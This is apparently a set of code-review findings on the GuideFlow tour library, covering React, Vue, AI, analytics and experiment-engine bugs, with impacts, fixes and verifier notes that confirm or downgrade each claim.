findings.verifierNote: The code is quoted verbatim (context.tsx:29-32) and useMemo is genuinely the wrong primitive for constructing a stateful singleton. But the stated production impact is unproven: React 18/19 do not discard useMemo values for a mounted component with unchanged deps, so the 'brand-new instance handed to context while the tour runs on the abandoned one' scenario is theoretical. The reproducible part is StrictMode dev double-invocation creating one extra createGuideFlow() that is dropped without destroy() — and even that is near-harmless, since a fresh instance attaches no document listeners until start() and injectStyles is id-idempotent. Downgrading to P2: correct-by-accident code hygiene, not a shipped defect.

findings.title: React 19 is in the peer range but @types/react is pinned to ^18, and UseTourStepReturn's RefObject<T> is incompatible with React 19's useRef typing

findings.title: useHotspot's returned `id` is always null — it reads a ref that is only assigned after render

findings.title: The three Storybook "Theme*" stories are byte-identical to Default — createGuideFlow() takes no theme — and construct an engine inside render()

findings.title: Vue useTour cleans up with onUnmounted, so listeners leak permanently when used outside a component instance
findings.impact: `onUnmounted` only registers when there is a *current component instance*. Calling `useTour()` from a Pinia store, a `effectScope()`, a router guard, or any plain composable factory — all normal Vue 3 patterns — logs `[Vue warn] onUnmounted is called when there is no active component instance` and registers nothing, so the five `gf.on(...)` subscriptions installed at lines 53-57 are never removed. Each such call permanently appends five closures to the emitter, and each of them writes to four refs on every `step:enter`/`step:exit`, so a store recreated per route accumulates dead subscribers that keep firing forever. `onScopeDispose` is the correct primitive and works in both component and standalone effect scopes.
findings.fix: Replace `onUnmounted` with `onScopeDispose` from 'vue' (it fires for component scopes too, so there is no behavioural regression), and add a Vue test that calls `useTour()` inside `effectScope()` and asserts the listeners are dropped on `scope.stop()`.

Downgrading to P2: the documented usage (`<script setup>`, JSDoc lines 27-35) is inside a component and cleans up correctly, so the leak requires an undocumented usage pattern.

findings.title: compress()'s persistence check is dead code — nothing ever writes a `step:`-prefixed progress key
findings.evidence: const completed = await instance.progress.isCompleted(userId, `step:${step.id}`);
findings.impact: `ProgressStore.isCompleted(userId, flowId)` reads the completed-flows array written only by `markCompleted(userId, flowId)` (packages/core/src/persistence/progress-store.ts:90-120), and the single caller is `progress.markCompleted(_config.context.userId, flowId)` in packages/core/src/index.ts:197 — always a flow id, never `step:<id>`. Nothing anywhere writes a `step:`-namespaced entry, so `isCompleted(userId, 'step:anything')` can never return `true` and the `if (completed) continue;` branch is unreachable. The documented purpose of `compress` — "remove steps the user has already demonstrated proficiency with" (brain.ts:203-204) — therefore never happens via persistence. What remains is line 227's `step.id.includes('intro')` substring heuristic, so the "adaptive step compression" feature is: make a second billed `detectIntent` LLM call (line 216) whose only use is gating a check for the literal substring `intro` in the step id. Combined with the fact that `compress` is called by no code outside brain.test.ts, the feature is effectively inert.
findings.fix: Decide the contract and make it real. If per-step completion is wanted, add `markStepCompleted`/`isStepCompleted` to `ProgressStore` (or emit on `step:exit` in core) so something actually writes the key, then use that here. Otherwise delete lines 221-225 and the `userId` parameter. Replace the `includes('intro')` heuristic at line 227 with a real signal — e.g. have the provider return a list of skippable step ids, or key off `step.meta` — or drop the second `detectIntent` call entirely, since one LLM round trip to evaluate one substring test is pure cost. Update apps/docs/guide/ai.md:63-71 to describe whatever survives.
findings.verifierNote: brain.ts:223 verbatim, and the surrounding facts check out: ProgressStore.isCompleted (progress-store.ts:118-121) reads only what markCompleted (90-102) wrote, and the sole in-repo caller is packages/core/src/index.ts:197 `void progress.markCompleted(_config.context.userId, flowId)` — always a flow id. compress() has no caller outside brain.test.ts (grep confirmed), and line 227's only surviving filter really is `step.id.includes('intro')`. But 'can never return true' is overstated: `progress` and `markCompleted` are public API on GuideFlowInstance (core/src/index.ts:89-135), so a consumer can legitimately write `step:` keys themselves and light the branch up. It is inert-by-default, not provably unreachable — hence PLAUSIBLE and P2 rather than P1.

findings.title: The documented generate() options object is passed to serializeDOM as a root element and throws
findings.impact: `generate(prompt = '', root?: Element | null)` (brain.ts:103) forwards its second argument straight to `serializeDOM(root)`, which does `const rootEl = root ?? document.body; Array.from(rootEl.querySelectorAll('*'))` (dom-context.ts:128-129). A plain options object is truthy, so `rootEl` becomes `{maxSteps: 5, placement: 'bottom'}` and the call throws `TypeError: rootEl.querySelectorAll is not a function`. Neither `maxSteps` nor `placement` exists anywhere in the package — there is no way to cap generated step count (`serializeDOM`'s `maxElements` caps input elements, not output steps) or set a default placement. The same page also claims under "How It Works" that "steps are validated against the actual DOM before returning" (line 39); `validateSteps` never touches the DOM, so a step targeting a nonexistent selector is returned as valid.
findings.fix: Delete the "Custom Generation Options" section, or implement it: change the signature to `generate(prompt?: string, options?: { root?: Element | null; maxSteps?: number; placement?: PopoverPlacement })` while keeping backward compatibility with an `Element` second argument (`options instanceof Element ? {root: options} : options`), apply `maxSteps` as a slice and `placement` as a per-step default in `validateSteps`. Fix the "Validation" bullet at line 39 to say what actually happens, or add real DOM verification (drop or flag steps whose `target` matches nothing) — which would also mitigate `nth-of-type-selector-unscoped`.

Grepped maxSteps and placement across packages/ai/src: neither exists as an option; serializeDOM's `maxElements` (line 123, default 80) caps input elements only. ai-generate.md:39's 'steps are validated against the actual DOM before returning' is also false — validation.ts touches no DOM API.

findings.title: apps/docs/guide/ai.md and ai-intent.md document IntentSignal and GuidedAnswer fields that do not exist

findings.title: apps/docs/api/ai/guide-brain.md documents a stopWatch() method that does not exist and gets three signatures wrong
findings.evidence:
### `stopWatch()`

Stops monitoring user events and clears the internal event buffer.

```ts
stopWatch(): void
```
findings.impact: `GuideBrain` has no `stopWatch` — grep of packages/ai/src returns nothing; the real API is the cleanup function returned by `watch()`. A user calling `gf.ai.stopWatch()` gets `TypeError: gf.ai.stopWatch is not a function` and keeps leaking listeners plus LLM calls. Three more mismatches on the same page: `watch(): void` (line 61) — it actually returns `() => void`; `compress(steps: Step[])` (line 83) — the real signature is `compress(steps, instance, userId?)` and omitting `instance` throws on `instance.progress.isCompleted`; and `destroy()` "clears the event buffer" (line 118) — `destroy()` clears the timer, cleanups, and listeners but never touches `eventBuffer` (brain.ts:269-274), so up to 200 buffered events survive and are re-sent to the LLM if the brain is re-watched. Line 51's `answer.stepId` also does not exist on `GuidedAnswer`, and line 36's `gf.start({ id: 'ai-tour', steps })` is not a valid `FlowDefinition` (which requires `initial` and `states`).
findings.fix: Rewrite the page against the real class: document `watch(): () => void` returning a cleanup, delete the `stopWatch()` section (or add the method to brain.ts as an alias that runs all cleanups *and* calls `clearBuffer()`), correct `compress` to its 3-arg form, and correct `destroy()`'s description — or better, add `this.eventBuffer = []` to `destroy()` so the doc becomes true. Replace `answer.stepId` with `answer.text`/`answer.highlights` and the `gf.start` example with the `{ id, initial, states }` shape used in README.md:39-43.
findings.verifierNote: Every claim on this page checks out. guide-brain.md:68-74 is verbatim and GuideBrain has no stopWatch (brain.ts exposes watch/generate/detectIntent/compress/chat/on/clearBuffer/destroy only). Line 61 says `watch(): void`; brain.ts:124 is `watch(): () => void`. Line 83 says `compress(steps: Step[])`; brain.ts:211 is `compress(steps, instance, userId?)` and line 223 dereferences `instance.progress`. Line 118 says destroy 'clears the event buffer'; brain.ts:269-274 clears the timer, cleanups and listeners but never touches eventBuffer (maxEventBuffer default 200, line 57). Line 51's `answer.stepId` is absent from GuidedAnswer (core types 286-291). Line 35's `gf.start({ id: 'ai-tour', steps })` is not a FlowDefinition, which requires `initial` and `states` (core types 104-108).

findings.title: serializeDOM ships the full page URL and all visible labels to a third-party LLM with no redaction hook
findings.impact: `window.location.href` includes the query string and fragment, so password-reset tokens, magic-link tokens, invite codes, `?email=`, and session identifiers are sent verbatim to OpenAI/Anthropic on every `generate()` and `chat()` call (the URL is embedded in the prompt at openai.ts:99 and anthropic.ts:87). `getLabel` (dom-context.ts:46-63) additionally harvests `aria-label`, the resolved `aria-labelledby` text, the enclosing `<label>`'s `textContent`, and any element's own `textContent` up to 80 chars — on an account page that is names, email addresses, order numbers, and balances. Selectors themselves embed attribute values (`[name="..."]`, `[aria-label="..."]`). To be precise about the bound: it does *not* read `.value`, so typed input contents are not sent, and `placeholder` (line 62) is not user data. But there is no allow/deny list, no redaction callback, no `includeUrl: false` option, and no mention of any of this in apps/docs — a library that silently forwards page content to a third party needs a documented data-flow section for GDPR/HIPAA users at minimum.
findings.fix: Add options to `serializeDOM` and `GuideBrainOptions`: `includeUrl?: boolean | 'origin-and-path'` (default to stripping search/hash — `url.origin + url.pathname` covers every legitimate use), `includeLabels?: boolean`, and a `redact?: (info: DOMElementInfo) => DOMElementInfo | null` hook applied to every element before it leaves the page. Skip elements matching a default deny list (`input[type=password]`, `[data-gf-private]`, `[autocomplete*="cc-"]`). Add a "What data is sent to your AI provider" section to apps/docs/guide/ai.md enumerating exactly the fields above.
findings.verifierNote: dom-context.ts:154-158 matches (url on 155). The URL is embedded in the outbound prompt at openai.ts:99 and anthropic.ts:87, and chat() rebuilds it again at brain.ts:247. getLabel (46-63) does harvest aria-label, resolved aria-labelledby textContent, the enclosing <label>'s textContent, and any element's own textContent up to 80 chars; selectors embed attribute values (18, 23, 28). The auditor's own scoping caveats are also correct — no `.value` read anywhere, and placeholder (line 62) is author-supplied. Grep for privacy/GDPR/redact/third-party across apps/docs/guide/ai*.md and apps/docs/api/ai/*.md returns zero hits, and serializeDOM's only parameters are root and maxElements — no allow/deny list, redaction hook, or includeUrl flag.

findings.title: `gf.ai` does not exist on GuideFlowInstance — every documented example fails type-check

const augmented = instance as T & { ai: GuideBrain };
  augmented.ai = brain;
findings.impact: `createAI` returns a widened type but mutates the original object, and `GuideFlowInstance` (packages/core/src/index.ts:89-135) declares no `ai` member. findings.title: No provider supports timeouts, abort signals, or cancellation; Ollama has no resilience at all
findings.impact: Grep for `signal`, `timeout`, `AbortController`, and `retry` across packages/ai/src returns zero implementation hits. Consequences differ by provider. For Ollama the `fetch` has no `signal` and no timeout: a local model that takes minutes, or an unreachable `baseUrl`, leaves `generate()` pending forever with no way to cancel — and since Ollama runs on localhost with no auth, there is also no retry and no `num_predict`/token cap, so a runaway generation is unbounded. For OpenAI/Anthropic the SDKs supply defaults (2 retries, 10-minute timeout), but those are not configurable through `OpenAIProviderOptions`/`AnthropicProviderOptions`, so a caller cannot shorten a 10-minute hang. Across all providers no request is cancellable: `GuideBrain.destroy()` clears the debounce timer but does not abort in-flight calls (brain.ts:269-274), so a component that unmounts mid-`generate` still pays for the completion, and a user who navigates away during a `chat()` cannot stop it. There is also no `usage`/cost surfacing anywhere — `response.usage` is available from both SDKs and discarded (openai.ts:64, anthropic.ts:51-52) — so callers have no way to observe the spend created by `uncapped-llm-calls-per-pause`.
findings.fix: Add `timeoutMs?: number` and `signal?: AbortSignal` to all four provider option types and thread them through: `AbortSignal.timeout(ms)` on the Ollama `fetch`, and the SDKs' per-request `{ timeout, signal }` / `maxRetries` options for OpenAI and Anthropic. Give `GuideBrain` an internal `AbortController` per in-flight call, abort them in `destroy()`, and accept an optional `signal` on `generate`/`chat`. Add `num_predict` to the Ollama body to bound output. Surface token usage: return it on a `usage` field or emit a `usage` brain event carrying `input_tokens`/`output_tokens` per call so consumers can meter cost.
findings.verifierNote: ollama.ts:33-35 verbatim, and the fetch options object (33-48) has no `signal` and no timeout. Grepped signal/timeout/AbortController/retry/usage across packages/ai/src: zero hits, so the 'no implementation' claim is exact. Ollama also sends no num_predict/token cap (body at 36-47), unlike OpenAI's maxTokens (openai.ts:58) and Anthropic's max_tokens (anthropic.ts:47). destroy() (brain.ts:269-274) only clearTimeouts the debounce and runs listener cleanups — nothing aborts an in-flight generate/chat. usage is discarded: openai.ts:64 returns only `response.choices[0]?.message?.content` and anthropic.ts:51-52 only the first text block.

findings.title: serializeDOM caps at the first 80 elements in document order and marks offscreen/hidden elements visible
findings.evidence:
const all = Array.from(rootEl.querySelectorAll('*')).filter(isInteresting);
  const capped = all.slice(0, maxElements);
findings.impact: Two defects in the payload the whole feature depends on. (1) The cap is a blind `slice(0, 80)` in document order, and `isInteresting` matches `nav`, `header`, `section`, `article`, `label`, and `h1`-`h6` (lines 95-100) — so on a real app whose header and nav contain 80+ links and headings, the entire main content is truncated away and the model is asked to build a tour of the navigation. Nothing prioritizes interactive or in-viewport elements. (2) `visible: rect.width > 0 && rect.height > 0` (line 147) is not a visibility test: elements with `visibility: hidden`, `opacity: 0`, `clip-path`, zero-alpha, behind a modal, or scrolled far outside the viewport all report `visible: true` (only `display: none`, which yields a 0x0 rect, is caught). The model happily targets them. Compounding both, `querySelectorAll` does not pierce shadow roots or iframes, so every element inside a web component or embedded frame is invisible to generation — and the selectors produced are not shadow-piercing, so even a hand-written target cannot reach them.
findings.fix: Sort before capping: rank by `interactive`, then by intersection with the viewport (`rect.top < innerHeight && rect.bottom > 0`), then by document order, and slice after sorting. Tighten `visible` to also check `getComputedStyle(el).visibility !== 'hidden' && Number(getComputedStyle(el).opacity) > 0`, and add a separate `inViewport` boolean so the model can distinguish the two. For shadow DOM, recurse into `el.shadowRoot` when open and emit a composed selector path (or at minimum document the limitation in apps/docs/guide/ai-generate.md, which currently claims "GuideFlow serializes the visible DOM"). Export `maxElements` through `GuideBrain.generate` so callers can tune the token/accuracy tradeoff.
findings.verifierNote: dom-context.ts:129-130 verbatim — a blind document-order slice(0, 80) with no prioritisation of interactive or in-viewport elements. INTERESTING_TAGS (95-100) does include nav, header, section, article, label and h1-h6, so nav/header chrome competes for the cap on equal footing. Line 147 is exactly `visible: rect.width > 0 && rect.height > 0`, which getBoundingClientRect satisfies for visibility:hidden, opacity:0, clipped, occluded, and far-offscreen elements — only display:none yields the 0x0 rect. querySelectorAll('*') on line 129 does not pierce shadow roots or iframes, and none of the four SELECTOR_STRATEGIES (10-30) emit shadow-piercing selectors.

findings.title: Three of seven UserEvent types are never produced, including the rage-click the type union advertises
findings.evidence: type: 'mousemove' | 'click' | 'scroll' | 'keydown' | 'focus' | 'blur' | 'rage-click'
findings.impact: `watch()` produces exactly four of these: `'click'`, `'focus'` (misassigned — it is pushed from the `input` event handler, brain.ts:151-154), `'scroll'`, and `'keydown'` (brain.ts:146-157). `'mousemove'`, `'blur'`, and `'rage-click'` are never emitted — grep across packages returns only the type declaration and the compiled `.d.ts`. `rage-click` is the single most diagnostic signal for the "user is confused/stuck" detection the docs sell (apps/docs/guide/ai-intent.md:39 defines `confused` as "User is clicking randomly"), and no rage-click detection exists anywhere: there is no click-clustering, no time-window counting, no repeat-target tracking. Because the LLM only ever sees the four plain event types, the intent classification it is asked to produce rests on a much weaker signal than the type union and the docs imply. The `input` -> `'focus'` mapping is separately misleading: a real focus event is not what was observed, so an `IntentSignal` reasoned from "focus" events is reasoning from typing.
findings.fix: Implement `rage-click` in `watch()`: track the last N clicks with timestamps and shallow selectors, and push a synthetic `{type: 'rage-click', target, meta: {count}}` when >=3 clicks land on the same target within ~1s. Add `blur` (cheap, `document.addEventListener('blur', ..., true)`) and optionally throttled `mousemove` behind an option, since idle-with-movement is the other classic stuck signal. Fix the `input` handler to push `'input'` (adding it to the union) or rename the handler, rather than mislabelling it as `'focus'`. Add these to the prompt hints in each provider's `detectIntent` so the model knows what the event names mean.
findings.verifierNote: packages/core/src/types/index.ts:271 is verbatim. brain.ts:146-157 emits exactly four: 'click' (148), 'focus' from the *input* handler (151-154), 'scroll' (156), 'keydown' (157). Grepped 'rage-click', 'mousemove' and "'blur'" across packages/*/src — the only hit is the type declaration itself, so all three are genuinely never produced and no click-clustering or repeat-target logic exists. apps/docs/guide/ai-intent.md:39 does define confused as 'User is clicking randomly, scrolling erratically, or revisiting elements', which is exactly what rage-click would supply. The input->'focus' mislabel is real and does mean the LLM is told 'focus' when it observed typing.

findings.title: validateSteps silently discards 7 of the 11 Step fields, including actions, media and showIf
findings.impact: `Step` (packages/core/src/types/index.ts:53-72) declares `showIf`, `padding`, `clickThrough`, `scrollIntoView`, `media`, `actions`, and `meta`. `validateSteps` reconstructs only `id`, `content`, `target`, and `placement`, so every other field a model emits is dropped with no warning. This is silent data loss on two paths: (1) a provider prompted for richer steps (the prompts are `Return format: [{ id, title, body, target?, placement? }]`, so today the loss is masked — but any user who customizes the prompt or writes a custom `AIProvider` and returns `media`/`actions` gets them stripped), and (2) callers who use `validateSteps` directly — it is a public export (index.ts:40) documented as a validation utility, so anyone round-tripping their own step JSON through it loses `meta` (which core's own comment labels `Metadata for analytics/AI`) and `actions`. `content.html` is also dropped even though `StepContent` supports it.
findings.fix: Either (a) make the omission explicit and intentional — rename to `validateGeneratedSteps`, document in the JSDoc at validation.ts:9-11 exactly which fields survive and why, and stop exporting it as a general-purpose validator — or (b) extend it to carry through the remaining serializable fields (`padding`, `clickThrough`, `scrollIntoView`, `media`, `actions`, `meta`, `content.html`) with per-field type checks, leaving only the non-serializable `showIf` function out. Add unit tests in packages/ai/src/__tests__/validation.test.ts asserting the chosen contract; the current tests (lines 5-53) only cover id/title/body/target/placement, so the loss is invisible.
findings.verifierNote: validation.ts:29-32 verbatim; the map only reconstructs id/content/target/placement (lines 24-51). Step at packages/core/src/types/index.ts:53-72 does declare showIf, padding, clickThrough, scrollIntoView, media, actions, meta, and StepContent (33-38) declares html — all dropped. validateSteps is a public export at index.ts:40. Downgrading to P2: today's prompts only ask for `{id,title,body,target?,placement?}` so nothing is actually lost on the shipped path, and `showIf` is a function that JSON can never carry, so the meaningful loss is limited to media/actions/meta/padding/clickThrough/scrollIntoView/content.html on custom-provider or direct-utility use.

findings.title: The collector's try/catch cannot catch async transport failures — `void t.track()` produces unhandled rejections
findings.impact: `AnalyticsTransport.track` is typed `void | Promise<void>` (src/transports/interface.ts:22) and apps/docs/api/analytics/transports.md:102 shows an `async` implementation, so async transports are the documented norm. `void` explicitly discards the promise, and a synchronous `try/catch` cannot observe its rejection — so a custom transport whose `fetch` rejects produces an `unhandledrejection` in the browser and, under Node 15+ (SSR, or the vitest/jsdom test runs of any consumer), an unhandled rejection that terminates the process by default. The `console.warn` guard gives a false sense that transport failures are contained. It also means transport errors are invisible with no counter or callback.
findings.fix: Handle both shapes: `const r = t.track(payload); if (r && typeof (r as Promise<void>).catch === 'function') (r as Promise<void>).catch(e => console.warn(...))`, keeping the sync try/catch. Better, add an `onError?: (transportName, event, error) => void` collector option so hosts can route these to their own error reporting instead of the console.
findings.verifierNote: collector.ts:113-119 is verbatim. track is typed `void | Promise<void>` at interface.ts:22 and the documented custom transport (transports.md:102) is async, so async implementations are the intended norm. `void` discards the promise and the surrounding sync try/catch cannot observe a later rejection — only a synchronous throw is caught. Unhandled rejections terminate the process by default on Node 15+.

findings.title: attach() silently refuses to bind to a new instance after the old one is destroyed, killing all analytics
findings.impact: `gf.destroy()` in core calls `this.removeAllListeners()` (packages/core/src/engine/tour.ts:190), which wipes the collector's subscriptions but leaves `this.cleanups` populated with now-dead unsubscribe closures. A SPA that tears down and recreates the tour instance (React StrictMode double-mount, route change, `createGuideFlow()` per page) then calls `collector.attach(gf2)`: the guard sees `cleanups.length > 0`, returns early, and subscribes to nothing. Every subsequent tour event is silently lost for the rest of the session, and the returned function detaches the dead first instance. No warning is logged. Same failure if a consumer attaches two different instances to one collector — the second is ignored.
findings.fix: Track the attached instance (`private target: GuideFlowInstance | null`). If `attach()` is called with a different instance, `detach()` first and re-subscribe; if called with the same instance, warn and no-op. Add a test that attaches, calls `gf.destroy()`, creates a new instance, re-attaches, and asserts events still arrive.
findings.verifierNote: Evidence is verbatim (collector.ts:56-59) and the re-attach no-op is real: cleanups is only emptied by detach(), so attach(gf2) after an external gf.destroy() (which does call this.removeAllListeners() at core/src/engine/tour.ts:190) subscribes to nothing and silently returns a detach for the dead instance. But the impact is overstated: the behaviour is explicitly documented in the JSDoc at collector.ts:52-53 ('Calling attach() a second time before detach() is a no-op'), and the normal React path uses the returned unsubscribe as the effect cleanup (tested at collector.test.ts:136-142), which clears cleanups before the remount — so StrictMode double-mount does not trigger it. The failure needs a consumer who reuses one collector across instances and never calls the returned function. Not shipped-broken for the documented usage.

findings.title: flush() swallows all transport errors and is never called on unload despite the interface promising it is
findings.impact: `Promise.allSettled` discards every rejection with no logging, so `await collector.flush()` — the exact call README.md:336 and packages/analytics/README.md:35 present as "Flush buffered events (e.g. on page unload)" — resolves successfully even when every transport failed. Combined with the `_flushing` early-return in WebhookTransport (webhook.ts:61), it can resolve without any network activity at all. Meanwhile src/transports/interface.ts:25-26 documents `flush()` as "Called on page unload or when the tour is destroyed" — nothing in the package registers an unload hook for the collector and nothing calls `flush()` on tour destroy, so a transport author relying on that contract will not be flushed. None of the four SDK transports implement `flush()` at all, so for a PostHog/Mixpanel/Amplitude/Segment-only setup `collector.flush()` is an unconditional no-op that returns a resolved promise.
findings.fix: Inspect the `allSettled` results and `console.warn` per rejected transport; consider returning a `{flushed, failed}` summary. Correct the `interface.ts` comment to state that the consumer must call `collector.flush()`, or add an opt-in `AnalyticsCollector` `pagehide`/`visibilitychange` hook that does it (paired with a `destroy()` that removes it). Implement `flush()` for Segment (`analytics.flush`) and Amplitude (`amplitude.flush`).
findings.verifierNote: collector.ts:96-100 matches verbatim; Promise.allSettled never rethrows and there is no inspection of the settled results, so all rejections vanish. transports/interface.ts:23-27 documents flush() as 'Called on page unload or when the tour is destroyed' and nothing in the package registers an unload hook for the collector or calls flush() on destroy. None of posthog.ts/mixpanel.ts/amplitude.ts/segment.ts define flush(), so `t.flush?.()` is undefined for all four and collector.flush() is a no-op for that setup.

findings.title: Marketing copy claims drop-off tracking and A/B integration with PostHog/Mixpanel/Amplitude; neither exists
findings.evidence: - **Analytics built-in** — track completion rates, drop-offs, and run A/B experiments without extra SDKs
findings.impact: Drop-off measurement requires attributing step events to a flow and knowing the ordinal position; the collector supplies neither (`flow_id: undefined` and no `stepIndex` on step events, collector.ts:74-82), and there is no funnel, cohort, or aggregation code anywhere in the package. apps/docs/index.md:39 goes further — "A/B Testing Built-in ... Plug into PostHog, Mixpanel, Amplitude, and more" — but `ExperimentEngine` (src/experiments.ts) has no import of, reference to, or awareness of any transport or of `AnalyticsCollector`; it cannot read a feature flag from PostHog, cannot write an exposure event, and cannot report a result. "without extra SDKs" is also inverted: four of the five transports require the vendor SDK to already be on the page and silently drop everything otherwise. Evaluators choosing the library on these two bullets discover after integration that the analytics they were promised have to be built from scratch.
findings.fix: Downgrade both claims to what ships: "forwards tour lifecycle events to your existing analytics stack" and "deterministic client-side variant assignment (bring your own experiment analysis)". Re-earn the original claims by fixing missing-flow-id-on-step-events, adding `guideflow.step.completed`, and adding exposure events per no-experiment-persistence-or-exposure — then restore the wording.
findings.verifierNote: apps/docs/guide/index.md:17 is verbatim, and apps/docs/index.md:38-39 reads 'A/B Testing Built-in ... Plug into PostHog, Mixpanel, Amplitude, and more.' experiments.ts contains no import or reference to any transport or to AnalyticsCollector, and collector.ts:74-82 supplies neither flow_id nor stepIndex on step events, so drop-off attribution is genuinely impossible. 'without extra SDKs' is contradicted by transports.md:22/36/50/64, which require each vendor SDK to be initialised first.

findings.title: Transports reference documents a `headers` option that does not exist and omits every option that does
findings.evidence: | `headers` | `Record<string, string>`          | Optional additional HTTP headers (e.g. auth tokens) |
findings.impact: `WebhookTransportOptions` (packages/analytics/src/transports/webhook.ts:3-14) exposes `url`, `apiKey`, `batchIntervalMs`, `maxQueueSize`, `maxRetries` — and no `headers`. The documented copy-paste example at lines 86-89 (`new WebhookTransport({ url, headers: { Authorization: \`Bearer ${token}\` } })`) type-errors under `exactOptionalPropertyTypes`-free configs only because excess-property checks fire on the literal; where it does compile through a variable, the constructor ignores `headers` entirely and the request goes out unauthenticated. The endpoint returns 401, the transport treats it as a flush failure, retries twice, then drops the batch with a console warning — a user following the official docs loses all analytics and gets no indication that the option they set was never read. The four real batching/retry options are undocumented, so nobody can tune them.
findings.fix: Rewrite the option table to match `WebhookTransportOptions` (all five fields with defaults) and add the missing `headers?: Record<string, string>` to the implementation since it is the more general and more useful API — merge it over the computed headers in `flush()`. Fix the example.
findings.verifierNote: transports.md:83 is verbatim and the example at :85-90 passes `headers`. WebhookTransportOptions at webhook.ts:3-14 exposes url, apiKey, batchIntervalMs, maxQueueSize, maxRetries and no headers; the constructor at :30-37 never reads it and headers are rebuilt from scratch at :66-67. batchIntervalMs/maxQueueSize/maxRetries are undocumented in that table. Severity corrected: a TS consumer copying the literal gets an excess-property error that names the offending option, which is a real (if ugly) guard; the silent-401 path is limited to JS consumers or object-variable indirection.

findings.title: Empty userId buckets all anonymous traffic into one variant, and all-zero weights produce a NaN bucket
findings.impact: Two unvalidated inputs. (1) `constructor(userId: string)` (line 56) accepts `''` with no guard, and the natural call `new ExperimentEngine(user?.id ?? '')` therefore hashes the constant `':<experimentId>'` for every logged-out visitor — 100% of anonymous traffic lands in the same variant, and the experiment reports a clean-looking but entirely invalid result. The package provides no anonymous-id generation or persistence to avoid this. (2) If every variant has `weight: 0` (a plausible way to express "pause this experiment"), `totalWeight` is 0, `hash % 0` is `NaN`, `NaN < cumulative` is always false, and the loop's fallback silently assigns `experiment.variants[0]` to everyone with no warning. Negative weights fall through the same path. `variants` is typed as non-empty (line 18) but nothing validates weights at all.
findings.fix: Throw (or `console.error` and return a documented null result) when `userId` is empty, and expose a `createAnonymousId()` helper that persists a UUID to localStorage. Validate in `assign()` that every weight is a finite number `>= 0` and that `totalWeight > 0`, throwing a clear message otherwise; add tests for empty userId, zero weights, and negative weights.
findings.verifierNote: experiments.ts:69-72 is verbatim; the constructor at :56-58 assigns userId with no validation. I verified both paths: djb2(':exp-one') % 2 === 1, so every empty-id visitor lands in the same variant; and with all weights 0, totalWeight is 0, hash % 0 is NaN, NaN < cumulative is always false, so the loop never breaks and the `chosen = experiment.variants[0]` initialiser at :78 silently wins. Nothing validates weights. The all-zero-weights half is a contrived input, but the empty-userId half is the natural `user?.id ?? ''` call.

findings.title: Four unconditional `declare global` Window augmentations are emitted into the published .d.ts and collide with real SDK types
findings.impact: The same pattern appears in mixpanel.ts:3, amplitude.ts:3 and segment.ts:3. `tsup.config.ts` sets `dts: true` and `package.json` points `types` at `./dist/index.d.ts`, so merely importing `@guideflow/analytics` injects these narrow declarations into every consumer's global scope. A consumer who also installs `posthog-js` (which declares `window.posthog` with the full `PostHog` type) or `@segment/analytics-next` (which declares `window.analytics`) gets `TS2717: Subsequent property declarations must have the same type` and their build fails — with the error pointing into `node_modules`, giving no clue that the analytics package caused it. `window.analytics` is a particularly high-collision name. Consumers who do not use PostHog at all still get `window.posthog` typed, masking typos.
findings.fix: Stop augmenting the global scope. Read the globals through a locally typed accessor instead: `const ph = (globalThis as { posthog?: { capture(...): void } }).posthog`. If augmentation must stay, move all four into one non-exported `src/globals.d.ts` that is excluded from the emitted `dts` entry, and use `unknown`-tolerant optional method shapes.
findings.verifierNote: posthog.ts:3-9 is verbatim, and mixpanel.ts:3-9, amplitude.ts:3-9, segment.ts:3-9 repeat the pattern. I confirmed the leak reaches consumers: packages/analytics/dist/index.d.ts contains four `declare global` blocks (lines 63, 79, 92, 105), tsup.config.ts sets dts: true, and package.json points types/exports at ./dist/index.d.ts. Conflicting Window property declarations from posthog-js or @segment/analytics-next do produce TS2717.

findings.title: goTo() emits no step:exit and resume() re-emits step:enter, so dwell time is lost and step views are double-counted
findings.impact: `next()` (line 114) and `prev()` (line 128) both call `this._emitStepExit()` first; `goTo()` does not. So a direct jump — which the demo wires to a visible button (apps/demo/src/App.tsx:431 `void gf.goTo('analytics-section')`) and which devtools uses — produces a `step:enter` with no preceding `step:exit`. The collector overwrites `this.stepStartTime` on the new enter (collector.ts:73), so the previous step's dwell is discarded and no `guideflow.step.exited` is recorded at all: the exited-event count silently diverges from the viewed-event count and time-on-step for jumped-away-from steps is permanently missing. Symmetrically, `pause()` (line 167) emits no `step:exit` while `resume()` (line 184) calls `_renderCurrentStep()`, which re-emits `step:enter` for the *same* step — so every pause/resume cycle inflates `guideflow.step.viewed` for that step and resets its dwell clock, understating time-on-step. Because `tour:pause`/`tour:resume` are not collected either, the inflated count is not even explainable after the fact.
findings.fix: Call `this._emitStepExit()` at the top of `goTo()` and in `pause()`. In the collector, dedupe re-entry: keep `{stepId, startedAt}` and, when a `step:enter` arrives for a step already open, emit the pending exit with its dwell first rather than silently discarding it. Add an `is_reentry` property so downstream can distinguish first views. Add a core test asserting the `step:exit`/`step:enter` pairing invariant across next/prev/goTo/pause/resume.
findings.verifierNote: tour.ts:133-137 (the auditor cites 135; the quoted block is lines 133-137) has no _emitStepExit(), while next() at :114 and prev() at :128 both call it. _renderCurrentStep() resets _stepExitEmitted = false at :255 and emits step:enter at :258, so the jumped-from step's exit is never emitted and collector.ts:73 overwrites stepStartTime, discarding the dwell. pause() at :167-175 emits only tour:pause; resume() at :178-185 calls _renderCurrentStep() which re-emits step:enter for the same step, so guideflow.step.viewed is double-counted. The demo call is real at apps/demo/src/App.tsx:431.

findings.title: Experiment assignments are recomputed rather than persisted and never emit an exposure event
findings.evidence: private cache = new Map<string, ExperimentResult<unknown>>();
findings.impact: The cache is in-memory and dies with the page, so stickiness is entirely a side effect of recomputing the same hash. Two consequences. (1) Any change to the experiment definition re-buckets the entire population mid-flight: adding a third variant changes `totalWeight` from 2 to 3, and adjusting weights from 50/50 to 60/40 changes `hash % 100` boundaries — users silently switch arms, the two halves of the data are not comparable, and nothing records that it happened. Real platforms persist the assignment for exactly this reason. (2) `assign()` returns a value and records nothing: there is no exposure/`$feature_flag_called` event, and `ExperimentEngine` has no reference to `AnalyticsCollector` anywhere in the package. apps/docs/guide/ab-testing.md:83-100 instructs users to stuff the variant into `globalProperties`, which means the only record of an assignment is a *tour* event — so a user assigned to a variant who never triggers a tour produces no data at all, and the experiment has no denominator. Also missing entirely: traffic allocation (no way to run on 10% of users), holdout groups, mutual exclusion/layers, targeting rules, a kill switch, sample-size or significance calculation, and any metric definition.
